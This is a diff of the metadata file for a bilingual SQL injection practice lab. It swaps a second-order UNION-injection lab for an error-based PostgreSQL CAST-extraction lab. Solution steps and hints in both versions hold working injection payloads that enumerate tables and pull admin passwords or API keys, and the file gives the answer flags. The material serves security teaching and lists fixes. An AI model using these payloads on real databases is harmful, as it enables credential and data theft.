@@ -1,167 +1,130 @@
-// src/modules/practice-labs/sql-injection/labs/lab4/lab4.metadata.ts
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const lab4Metadata: LabMetadata = {
-  slug: 'sqli-second-order',
-  title: 'SQL Injection: Second-Order (Stored) Attack',
-  ar_title: 'حقن SQL: الحقن من الدرجة الثانية (المخزَّن)',
+  slug: 'sqli-error-based',
+  title: 'SQL Injection: Error-Based Extraction',
+  ar_title: 'حقن SQL: الاستخراج القائم على الأخطاء',
   description:
-    "The input field is protected. The report generator isn't. Store a malicious payload in your profile, then trigger the vulnerable report query to fire it.",
+    'Force the database to reveal data through verbose error messages. Extract table names, columns, and values without UNION or blind techniques.',
   ar_description:
-    'حقل الإدخال محمي — المدخلات تُحفظ بأمان عبر ORM. لكن مولّد التقارير يستخدم البيانات المخزّنة في raw query. خزّن payload خبيثًا ثم شغّل التقرير لإطلاقه.',
-  difficulty: 'ADVANCED',
+    'أجبر قاعدة البيانات على الكشف عن البيانات من خلال رسائل الأخطاء المفصّلة. استخرج أسماء الجداول والأعمدة والقيم دون UNION أو تقنيات الأعمى.',
+  difficulty: 'INTERMEDIATE',
   category: 'WEB_SECURITY',
-  skills: [
-    'SQL Injection',
-    'Second-Order SQLi',
-    'Stored Payloads',
-    'UNION Attack',
-    'ORM False Security',
-  ],
-  xpReward: 400,
-  pointsReward: 200,
-  duration: 50,
+  skills: ['SQL Injection', 'Error-Based Extraction', 'PostgreSQL Casting', 'Database Enumeration'],
+  xpReward: 180,
+  pointsReward: 90,
+  duration: 40,
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
+  environmentType: 'PORTAL_AUTH',
+  canonicalConceptId: 'sqli-error',
 
-  // ─── للمتدرب ────────────────────────────────────────────────────
-  goal: 'Store a UNION-based SQLi payload in your display name, then trigger the report generator to extract the admin password.',
-  ar_goal:
-    'خزّن payload حقن SQL بأسلوب UNION في اسمك المعروض، ثم شغّل مولّد التقارير لاستخراج كلمة مرور المدير.',
+  goal: 'Use PostgreSQL CAST error-based injection to extract the admin API key from the database.',
+  ar_goal: 'استخدم حقن PostgreSQL القائم على خطأ CAST لاستخراج مفتاح API للأدمن من قاعدة البيانات.',
+
+  missionBrief: {
+    codename: 'ERROR LEAK',
+    classification: 'SECRET',
+    objective: 'A user profile portal reflects verbose PostgreSQL errors when queries fail. Use CAST() type mismatch errors to extract the admin API key embedded in the database.',
+    ar_objective: 'بوابة ملفات المستخدمين تعكس أخطاء PostgreSQL مفصّلة عند فشل الاستعلامات. استخدم أخطاء عدم التوافق في CAST() لاستخراج مفتاح API للأدمن المضمّن في قاعدة البيانات.',
+    background: 'Error-based injection is powerful when apps display raw DB errors. PostgreSQL CAST errors include the value being converted, which leaks data directly.',
+    successCriteria: [
+      'Trigger a PostgreSQL CAST error to confirm error-based injection',
+      'Enumerate table names using information_schema',
+      'Extract the api_key column from the admin_keys table',
+      'Submit the flag',
+    ],
+  },
+
+  labInfo: {
+    vulnType: 'Error-Based SQL Injection',
+    ar_vulnType: 'حقن SQL القائم على الأخطاء',
+    cweId: 'CWE-89',
+    cvssScore: 8.8,
+    description: 'When error messages contain query data, CAST() tricks force the DB to try converting a string result to integer — failing with the value in the error message.',
+    ar_description: 'عندما تحتوي رسائل الأخطاء على بيانات الاستعلام، تجبر حيل CAST() قاعدة البيانات على محاولة تحويل نتيجة نصية إلى عدد صحيح — مما يفشل مع القيمة في رسالة الخطأ.',
+    whatYouLearn: [
+      'How CAST() errors leak data in PostgreSQL',
+      'How to enumerate tables via information_schema',
+      'How to extract arbitrary column values through error messages',
+    ],
+    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
+  },
 
   briefing: {
-    en: `NeoHire is a digital recruitment platform. You're an applicant — one of thousands.
-You can update your profile display name. The system saves it perfectly — no errors, no warnings.
-Try a single quote. It saves just fine. The developers are clearly using an ORM, right?
-But NeoHire has a feature: "Generate Application Report" — a PDF summary of your profile.
-You've never seen what goes on behind that button.
-Safe input. Stored safely. Used somewhere else entirely.
-The question is: where does your name end up in the backend?`,
-    ar: `NeoHire هي منصة توظيف رقمية. أنت مقدّم طلب — واحد من آلاف.
-يمكنك تحديث اسمك المعروض في الملف الشخصي. النظام يحفظه بشكل مثالي — لا أخطاء، لا تحذيرات.
-جرّب علامة اقتباس مفردة. تحفظ بشكل طبيعي تماماً. المطورون يستخدمون ORM بوضوح، أليس كذلك؟
-لكن NeoHire لديها ميزة: "إنشاء تقرير الطلب" — ملخص PDF لملفك الشخصي.
-لم ترَ قط ما يحدث خلف ذلك الزر.
-مدخل آمن. مخزَّن بأمان. مستخدَم في مكان آخر تماماً.
-السؤال هو: أين ينتهي اسمك في الـ backend؟`,
+    en: `A developer portal lets admins look up users by ID.\nYou found it shows raw PostgreSQL error messages when queries fail.\n"invalid input syntax for type integer: \"admin_key_here\""\nThat error message just became your exfiltration channel.`,
+    ar: `بوابة المطورين تتيح للأدمن البحث عن المستخدمين بالمعرّف.\nوجدت أنها تُظهر رسائل خطأ PostgreSQL الخام عند فشل الاستعلامات.\n"invalid input syntax for type integer: \"admin_key_here\""\nرسالة الخطأ هذه أصبحت قناة تسريب بياناتك.`,
   },
 
   stepsOverview: {
     en: [
-      'Update your display name normally — understand what the /set-name endpoint does',
-      'Try injecting SQL characters in the name — observe that the input is safely stored (ORM protection)',
-      'Trigger the /generate-report endpoint — notice it uses your stored name differently',
-      'Craft a UNION payload as your display name and save it via /set-name',
-      'Trigger /generate-report again — your stored payload fires in the raw query context',
+      'Trigger — inject CAST to force a type error and confirm data leaks',
+      'Enumerate — extract table names from information_schema',
+      'Extract — pull the api_key from admin_keys table via CAST error',
     ],
     ar: [
-      'حدّث اسمك المعروض بشكل طبيعي — افهم ما تفعله نقطة /set-name',
-      'جرّب حقن أحرف SQL في الاسم — لاحظ أن المدخل محفوظ بأمان (حماية ORM)',
-      'شغّل نقطة /generate-report — لاحظ أنها تستخدم اسمك المخزَّن بشكل مختلف',
-      'صمّم payload UNION كاسمك المعروض واحفظه عبر /set-name',
-      'شغّل /generate-report مجدداً — يُطلَق payload المخزَّن في سياق raw query',
+      'تشغيل — احقن CAST لإجبار خطأ النوع وتأكيد تسريب البيانات',
+      'تعداد — استخرج أسماء الجداول من information_schema',
+      'استخراج — اسحب api_key من جدول admin_keys عبر خطأ CAST',
     ],
   },
 
-  // ─── للأدمن فقط ─────────────────────────────────────────────────
   solution: {
-    context:
-      'NeoHire applicant portal. Updating display name uses Prisma ORM (parameterized — safe). ' +
-      "But when generating the 'Application Report', the system reads the stored name from DB " +
-      'and concatenates it directly into a raw SQL ILIKE query. Injection fires AFTER storage — most security scanners miss this entirely.',
-    vulnerableCode:
-      '// Step 1 — SAFE: stored via Prisma ORM\n' +
-      'await prisma.labGenericUser.update({ data: { email: displayName } });\n\n' +
-      '// Step 2 — VULNERABLE: read safely, then injected raw\n' +
-      'const name = profile.email;\n' +
-      'const query = `SELECT username, email, role FROM "LabGenericUser" WHERE username ILIKE \'%${name}%\'`;',
-    exploitation:
-      'Step 1 — POST /lab4/set-name:\n' +
-      '  { displayName: "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--" }\n\n' +
-      'Step 2 — POST /lab4/generate-report → stored payload fires → admin password returned in results.',
+    context: 'User lookup: SELECT * FROM users WHERE id = $input (no parameterization)',
+    vulnerableCode: "SELECT * FROM users WHERE id = '$input'",
+    exploitation: "Step 1: CAST((SELECT 'test') AS integer) → error with 'test'. Step 2: CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS integer) → leaks table name. Step 3: CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer) → leaks api_key.",
     steps: {
       en: [
-        'POST /lab4/set-name with { displayName: "test\'quote" } → saved successfully. Input is safe (ORM). No injection here.',
-        'POST /lab4/generate-report → observe the response. It returns a list of users matching your name via ILIKE — this is a raw query.',
-        'Now craft the payload: displayName = "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--"',
-        'POST /lab4/set-name with the payload → stored safely by ORM (no execution at this point)',
-        "POST /lab4/generate-report → raw query executes: ILIKE '%applicant%' UNION SELECT ... WHERE role='admin'-- → admin password appears in results",
+        "id=1 AND 1=CAST((SELECT 'data_test') AS integer)-- → error reveals 'data_test'",
+        "id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS integer)-- → leaks table name",
+        "id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)-- → leaks API key = flag",
       ],
       ar: [
-        'أرسل POST /lab4/set-name مع { displayName: "test\'quote" } → محفوظ بنجاح. المدخل آمن (ORM). لا حقن هنا.',
-        'أرسل POST /lab4/generate-report → لاحظ الاستجابة. تُرجع قائمة مستخدمين يطابقون اسمك عبر ILIKE — هذا raw query.',
-        'صمّم الـ payload: displayName = "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--"',
-        'أرسل POST /lab4/set-name مع الـ payload → محفوظ بأمان بواسطة ORM (لا تنفيذ في هذه المرحلة)',
-        "أرسل POST /lab4/generate-report → يُنفَّذ raw query: ILIKE '%applicant%' UNION SELECT ... WHERE role='admin'-- → كلمة مرور الأدمن تظهر في النتائج",
+        "id=1 AND 1=CAST((SELECT 'data_test') AS integer)-- → الخطأ يكشف 'data_test'",
+        "id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS integer)-- → يكشف اسم الجدول",
+        "id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)-- → يكشف مفتاح API = العلم",
       ],
     },
     fix: [
-      'The report generator must also use parameterized queries — never concatenate stored values into raw SQL',
-      'Treat stored data as untrusted — sanitize and validate at the point of USE, not just at input',
-      'Code review all raw query usages and flag any string interpolation from DB-sourced values',
-      'Use a SAST tool configured to track data flow from DB reads to SQL construction',
+      'Never expose raw DB error messages to users',
+      'Use generic error pages',
+      'Use parameterized queries',
+      'Cast input to integer before use: parseInt(id)',
     ],
   },
 
   postSolve: {
     explanation: {
-      en: 'Second-Order SQL Injection occurs when malicious input is safely stored in the database (often via ORM or prepared statements), but later retrieved and used in a different, unparameterized query. The injection fires at the point of USE — not the point of INPUT — making it invisible to standard input validation and many security scanners.',
-      ar: 'يحدث حقن SQL من الدرجة الثانية عندما يُحفظ مدخل خبيث بأمان في قاعدة البيانات (غالباً عبر ORM أو prepared statements)، لكنه يُسترجع لاحقاً ويُستخدم في استعلام مختلف غير محمي. يُطلَق الحقن عند نقطة الاستخدام — لا نقطة الإدخال — مما يجعله غير مرئي للتحقق القياسي من المدخلات والكثير من أدوات الفحص الأمني.',
+      en: 'PostgreSQL CAST errors include the value that failed conversion. By wrapping a subquery in CAST(... AS integer), the subquery result appears verbatim in the error message.',
+      ar: 'أخطاء PostgreSQL CAST تتضمن القيمة التي فشل تحويلها. بتغليف استعلام فرعي في CAST(... AS integer)، تظهر نتيجة الاستعلام الفرعي كاملة في رسالة الخطأ.',
     },
     impact: {
-      en: 'Attackers can bypass all input-level protections by staging the attack across two separate operations. Any feature that reads stored user data and uses it in queries becomes a potential trigger — reports, exports, notifications, audit logs.',
-      ar: 'يمكن للمهاجمين تجاوز جميع حمايات مستوى الإدخال بتنظيم الهجوم عبر عمليتين منفصلتين. أي ميزة تقرأ بيانات مستخدم مخزَّنة وتستخدمها في الاستعلامات تصبح مشغّلاً محتملاً — التقارير والتصدير والإشعارات وسجلات التدقيق.',
+      en: 'Complete data extraction through error messages. No blind inference needed — every query result is delivered directly in the HTTP response.',
+      ar: 'استخراج كامل للبيانات من خلال رسائل الأخطاء. لا حاجة للاستنتاج الأعمى — كل نتيجة استعلام تُسلَّم مباشرة في استجابة HTTP.',
     },
-    fix: [
-      'Parameterize queries at the point of execution — regardless of data source',
-      'Never trust data just because it came from your own database',
-      'Data flow analysis: trace all DB-sourced values that reach SQL construction',
-      'Principle of defense in depth: multiple layers of protection at both input and use',
-    ],
+    fix: ['Generic error pages', 'Parameterized queries', 'Input validation'],
   },
 
   hints: [
     {
       order: 1,
-      xpCost: 10,
-      content:
-        'Try /set-name with a single quote in the name — it saves fine! The INPUT is protected. Now call /generate-report and observe what changes in the response.',
+      xpCost: 15,
+      content: "Test error-based injection by triggering a CAST type mismatch:\n  /user?id=1 AND 1=CAST((SELECT 'hello') AS integer)--\nIf the error shows 'hello', the app leaks query results through errors.",
     },
     {
       order: 2,
       xpCost: 25,
-      content:
-        '/generate-report takes no user input — it reads your stored profile name. But it builds a raw ILIKE query using that stored name. Your payload executes THERE, not at /set-name.',
+      content: "Enumerate tables using information_schema:\n  /user?id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1) AS integer)--\nNote the table names that appear in the error.",
     },
     {
       order: 3,
       xpCost: 40,
-      content:
-        "The report query uses: ILIKE '%yourName%'. Close the ILIKE with %', then append a UNION SELECT to extract the admin password column from LabGenericUser.",
+      content: "Extract the API key from admin_keys table:\n  /user?id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)--\nThe full API key (= your flag) will appear in the error message.",
     },
   ],
 
-  flagAnswer: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
+  flagAnswer: 'FLAG{SQLI_ERROR_BASED_SUCCESS}',
   initialState: {
-    users: [
-      {
-        username: 'applicant',
-        email: 'pending',
-        role: 'applicant',
-        password: 'app_temp_pass',
-      },
-      {
-        username: 'hr_review',
-        email: 'hr@neohire.io',
-        role: 'reviewer',
-        password: 'hr_review_pass',
-      },
-      {
-        username: 'hr_admin',
-        email: 'admin@neohire.io',
-        role: 'admin',
-        password: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
-      },
-    ],
+    admin_keys: [{ id: 1, api_key: 'FLAG{SQLI_ERROR_BASED_SUCCESS}' }],
   },
 };
